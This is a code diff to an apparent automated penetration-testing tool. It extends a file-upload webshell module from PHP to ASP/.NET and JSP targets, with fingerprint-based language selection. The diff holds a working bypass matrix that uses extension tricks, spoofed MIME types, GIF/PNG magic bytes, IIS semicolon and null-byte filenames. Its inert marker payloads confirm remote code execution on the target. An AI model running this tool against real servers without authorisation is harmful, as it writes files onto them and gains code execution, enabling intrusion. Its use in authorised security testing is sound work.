@@ -6400,24 +6400,70 @@ def _gather_upload_targets(ip: str, port: int, proto: str) -> list:
     return tgts[:_UPLOAD_MAX_FORMS]
 
 
-def _php_upload_variants(base: str, php: bytes) -> list:
-    """PHP extension / MIME / magic-byte bypass matrix for one probe. Each entry is
+def _detect_web_langs(ip: str, port: int, proto: str) -> list:
+    """Which server-side language(s) to target, inferred from the fingerprint (services +
+    earlier http-* output): ASP/.NET on IIS, JSP on Tomcat/Java, PHP otherwise. Returns an
+    ordered list — the detected stack first — so the upload tool auto-switches its payload."""
+    blob = ""
+    for (nm, prod, _ver, cpe) in fetch_services(ip).values():
+        blob += " ".join(x for x in (nm, prod, cpe) if x).lower() + " "
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid in ("http-headers", "http-fingerprint", "http-source"):
+            blob += " " + (output or "").lower()
+    langs = []
+    if re.search(r"asp\.net|microsoft-iis|\biis\b|x-aspnet|x-powered-by:\s*asp|\.aspx?\b", blob):
+        langs.append("asp")
+    if re.search(r"tomcat|coyote|\bjsp\b|jboss|jetty|wildfly|glassfish|servlet|\bjava\b", blob):
+        langs.append("jsp")
+    if re.search(r"\bphp\b|x-powered-by:\s*php|\.php\b", blob) or not langs:
+        langs.append("php")                                   # default when nothing else matched
+    return langs
+
+
+def _upload_variants(lang: str, base: str, mark: str, a: int, b: int) -> list:
+    """Extension / MIME / magic-byte bypass matrix for one language. The payload is inert — it
+    echoes mark·(a*b)·mark so execution is provable by arithmetic. Each entry is
     (label, sent-filename, content-type, file-bytes, [names to fetch the stored file back])."""
     gif, png = b"GIF89a;\n", b"\x89PNG\r\n\x1a\n"
-    return [
-        ("phtml",              f"{base}.phtml",   "image/jpeg",              php,        [f"{base}.phtml"]),
-        ("php5",               f"{base}.php5",    "image/jpeg",              php,        [f"{base}.php5"]),
-        ("pht",                f"{base}.pht",     "image/jpeg",              php,        [f"{base}.pht"]),
-        ("phar",               f"{base}.phar",    "application/octet-stream", php,       [f"{base}.phar"]),
-        ("php + image ctype",  f"{base}.php",     "image/png",               php,        [f"{base}.php"]),
-        ("magic GIF89a .php",  f"{base}.php",     "image/gif",               gif + php,  [f"{base}.php"]),
-        ("magic PNG .phtml",   f"{base}.phtml",   "image/png",               png + php,  [f"{base}.phtml"]),
-        ("double .php.jpg",    f"{base}.php.jpg", "image/jpeg",              php,        [f"{base}.php.jpg", f"{base}.php"]),
-        ("double .jpg.php",    f"{base}.jpg.php", "image/jpeg",              php,        [f"{base}.jpg.php"]),
-        ("case .pHp",          f"{base}.pHp",     "image/jpeg",              php,        [f"{base}.pHp", f"{base}.php"]),
-        ("trailing dot .php.", f"{base}.php.",    "image/jpeg",              php,        [f"{base}.php", f"{base}.php."]),
-        ("nullbyte .php\\0.jpg", f"{base}.php\x00.jpg", "image/jpeg",        php,        [f"{base}.php"]),
-    ]
+    if lang == "php":
+        p = f"<?php echo '{mark}',{a}*{b},'{mark}'; ?>".encode()
+        return [
+            ("phtml",              f"{base}.phtml",   "image/jpeg",              p,       [f"{base}.phtml"]),
+            ("php5",               f"{base}.php5",    "image/jpeg",              p,       [f"{base}.php5"]),
+            ("pht",                f"{base}.pht",     "image/jpeg",              p,       [f"{base}.pht"]),
+            ("phar",               f"{base}.phar",    "application/octet-stream", p,      [f"{base}.phar"]),
+            ("php + image ctype",  f"{base}.php",     "image/png",               p,       [f"{base}.php"]),
+            ("magic GIF89a .php",  f"{base}.php",     "image/gif",               gif + p, [f"{base}.php"]),
+            ("magic PNG .phtml",   f"{base}.phtml",   "image/png",               png + p, [f"{base}.phtml"]),
+            ("double .php.jpg",    f"{base}.php.jpg", "image/jpeg",              p,       [f"{base}.php.jpg", f"{base}.php"]),
+            ("double .jpg.php",    f"{base}.jpg.php", "image/jpeg",              p,       [f"{base}.jpg.php"]),
+            ("case .pHp",          f"{base}.pHp",     "image/jpeg",              p,       [f"{base}.pHp", f"{base}.php"]),
+            ("trailing dot .php.", f"{base}.php.",    "image/jpeg",              p,       [f"{base}.php", f"{base}.php."]),
+            ("nullbyte .php\\0.jpg", f"{base}.php\x00.jpg", "image/jpeg",        p,       [f"{base}.php"]),
+        ]
+    if lang == "asp":
+        c = f'<%Response.Write("{mark}" & ({a}*{b}) & "{mark}")%>'.encode()               # classic ASP (VBScript)
+        n = f'<%@ Page Language="C#"%><%Response.Write("{mark}"+({a}*{b})+"{mark}");%>'.encode()  # ASP.NET
+        return [
+            ("asp classic",       f"{base}.asp",      "image/jpeg", c,       [f"{base}.asp"]),
+            ("asa",               f"{base}.asa",      "image/jpeg", c,       [f"{base}.asa"]),
+            ("cer",               f"{base}.cer",      "image/jpeg", c,       [f"{base}.cer"]),
+            ("asp;.jpg (IIS6)",   f"{base}.asp;.jpg", "image/jpeg", c,       [f"{base}.asp;.jpg", f"{base}.asp"]),
+            ("magic GIF89a .asp", f"{base}.asp",      "image/gif",  gif + c, [f"{base}.asp"]),
+            ("double .asp.jpg",   f"{base}.asp.jpg",  "image/jpeg", c,       [f"{base}.asp.jpg", f"{base}.asp"]),
+            ("aspx .NET",         f"{base}.aspx",     "image/jpeg", n,       [f"{base}.aspx"]),
+            ("aspx;.jpg",         f"{base}.aspx;.jpg", "image/jpeg", n,      [f"{base}.aspx;.jpg", f"{base}.aspx"]),
+        ]
+    if lang == "jsp":
+        j = f'<% out.print("{mark}"+({a}*{b})+"{mark}"); %>'.encode()
+        return [
+            ("jsp",               f"{base}.jsp",      "image/jpeg", j,       [f"{base}.jsp"]),
+            ("jspx",              f"{base}.jspx",     "image/jpeg", j,       [f"{base}.jspx"]),
+            ("jsp;.jpg",          f"{base}.jsp;.jpg", "image/jpeg", j,       [f"{base}.jsp;.jpg", f"{base}.jsp"]),
+            ("magic GIF89a .jsp", f"{base}.jsp",      "image/gif",  gif + j, [f"{base}.jsp"]),
+            ("double .jsp.jpg",   f"{base}.jsp.jpg",  "image/jpeg", j,       [f"{base}.jsp.jpg", f"{base}.jsp"]),
+        ]
+    return []
 
 
 def _multipart(fields: dict, file_field: str, filename: str, ctype: str, data: bytes) -> tuple:
@@ -6434,12 +6480,13 @@ def _multipart(fields: dict, file_field: str, filename: str, ctype: str, data: b
 
 
 def _tool_file_upload(ip: str, port: int, proto: str) -> str:
-    """HTTP step-21 tool: attempt to upload a PHP webshell through discovered upload forms,
-    working an extension / MIME / magic-byte bypass matrix. The payload is INERT (it echoes a
-    unique marker × arithmetic — no live command shell); the result is proven by fetching the
-    stored file back and checking the arithmetic executed. RCE-confirmed vs merely-stored are
-    reported separately, and every uploaded artifact is listed for manual removal. Stdlib only;
-    a dead server raises. Authorised targets only — this writes files to the target."""
+    """HTTP step-21 tool: attempt to upload a webshell through discovered upload forms, working
+    an extension / MIME / magic-byte bypass matrix. The language auto-switches from the
+    fingerprint — PHP by default, ASP/.NET on IIS, JSP on Tomcat/Java. The payload is INERT (it
+    echoes a unique marker × arithmetic — no live command shell); the result is proven by
+    fetching the stored file back and checking the arithmetic executed. RCE-confirmed vs
+    merely-stored are reported separately, and every uploaded artifact is listed for manual
+    removal. Stdlib only; a dead server raises. Authorised targets only — this writes files."""
     import http.client
     import ssl
     import time
@@ -6478,19 +6525,21 @@ def _tool_file_upload(ip: str, port: int, proto: str) -> str:
         raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test upload")
 
     targets = _gather_upload_targets(ip, port, proto)
+    langs = _detect_web_langs(ip, port, proto)
     deadline = time.time() + _UPLOAD_DEADLINE
     surfaces, rce, stored, artifacts = [], [], [], []
     tested = [0]
 
     def _verify(hostval, vpath, mark, product):
-        """GET a stored file back → 'rce' if the arithmetic executed, 'stored' if our raw PHP
-        is served verbatim (upload worked, execution didn't), else None."""
+        """GET a stored file back → 'rce' if the arithmetic executed (mark·product·mark), 'stored'
+        if our raw payload is served verbatim (upload worked, execution didn't), else None. The
+        marker is unique per probe, so its mere presence is a reliable language-agnostic signal."""
         st, body, _sc, _loc = _req(hostval, "GET", vpath)
         if st is None or st == 404 or not body:
             return None
         if f"{mark}{product}{mark}" in body:
             return "rce"
-        if mark in body and "<?php" in body:
+        if mark in body:
             return "stored"
         return None
 
@@ -6537,43 +6586,45 @@ def _tool_file_upload(ip: str, port: int, proto: str) -> str:
         pr = urllib.parse.urlparse(action)
         apath = pr.path + (f"?{pr.query}" if pr.query else "")
         cookie = "; ".join(c.split(";")[0] for c in gsc)
-        hit = False
-        token = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
-        base = "psh" + token
-        mark = "PSHUP" + token
-        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
-        product = str(a * b)
-        php = f"<?php echo '{mark}',{a}*{b},'{mark}'; ?>".encode()
-        for label, upname, ctype, data, names in _php_upload_variants(base, php):
-            if time.time() >= deadline:
+        rce_hit, stored_hit = False, False       # one RCE ends the form; one stored is enough to note
+        for lang in langs:                       # auto-switch payload language per the fingerprint
+            if rce_hit or time.time() >= deadline:
                 break
-            body, boundary = _multipart(form["fields"], form["file"], upname, ctype, data)
-            extra = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
-            if cookie:
-                extra["Cookie"] = cookie
-            st, rbody, _sc, _loc = _req(hostval, "POST", apath, body=body, extra=extra)
-            tested[0] += 1
-            if st is None:
-                continue
-            accepted = st in (200, 201, 204, 301, 302, 303)
-            vpath, verdict = _locate(hostval, rbody if accepted else "", names, mark, product)
-            if verdict == "rce":
-                url = f"{scheme}://{hostval}:{port}{vpath}"
-                rce.append(f"  ✗ UPLOAD {url}  (php · {label})  [via {hostval}{apath}]")
-                artifacts.append(f"{hostval}{vpath}")
-                hit = True
-                break
-            if verdict == "stored":
-                url = f"{scheme}://{hostval}:{port}{vpath}"
-                stored.append(f"  ⚠ UPLOAD {url}  (php · {label}, exec unconfirmed)  [via {hostval}{apath}]")
-                artifacts.append(f"{hostval}{vpath}")
-                hit = True
-                break
-        if hit and time.time() >= deadline:
+            token = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
+            base = "psh" + token
+            mark = "PSHUP" + token
+            a, b = random.randint(1000, 9999), random.randint(1000, 9999)
+            product = str(a * b)
+            for label, upname, ctype, data, names in _upload_variants(lang, base, mark, a, b):
+                if time.time() >= deadline:
+                    break
+                body, boundary = _multipart(form["fields"], form["file"], upname, ctype, data)
+                extra = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
+                if cookie:
+                    extra["Cookie"] = cookie
+                st, rbody, _sc, _loc = _req(hostval, "POST", apath, body=body, extra=extra)
+                tested[0] += 1
+                if st is None:
+                    continue
+                accepted = st in (200, 201, 204, 301, 302, 303)
+                vpath, verdict = _locate(hostval, rbody if accepted else "", names, mark, product)
+                if verdict == "rce":
+                    url = f"{scheme}://{hostval}:{port}{vpath}"
+                    rce.append(f"  ✗ UPLOAD {url}  ({lang} · {label})  [via {hostval}{apath}]")
+                    artifacts.append(f"{hostval}{vpath}")
+                    rce_hit = True
+                    break
+                if verdict == "stored" and not stored_hit:
+                    url = f"{scheme}://{hostval}:{port}{vpath}"
+                    stored.append(f"  ⚠ UPLOAD {url}  ({lang} · {label}, exec unconfirmed)  [via {hostval}{apath}]")
+                    artifacts.append(f"{hostval}{vpath}")
+                    stored_hit = True
+                    break                        # move to next language to seek an RCE
+        if time.time() >= deadline:
             break
 
     reason = "deadline" if time.time() >= deadline else "complete"
-    lines = [f"{scheme}://{ip}:{port}/ file-upload webshell (PHP)",
+    lines = [f"{scheme}://{ip}:{port}/ file-upload webshell ({'/'.join(langs)})",
              f"surfaces: {len(surfaces)} form · uploads tried {tested[0]} · "
              f"RCE {len(rce)} · stored {len(stored)} · {reason}"]
     if surfaces:
@@ -6615,7 +6666,7 @@ _STEP_TOOLS = {
     "rfi-scan": ("RFI / wrapper inclusion (stdlib) → data://, php://input", _tool_rfi_scan),
     "cmdi-scan": ("OS command injection (stdlib: echo/time) → id/uname, RCE cmd", _tool_cmdi_scan),
     "ssti-scan": ("SSTI (stdlib, math-verified) → engine + auto-id RCE + cmd", _tool_ssti_scan),
-    "upload-shell": ("file-upload webshell (stdlib, PHP, exec-verified)", _tool_file_upload),
+    "upload-shell": ("file-upload webshell (stdlib, PHP/ASP/JSP auto, exec-verified)", _tool_file_upload),
 }
 
 def _mins(seconds: int) -> str:
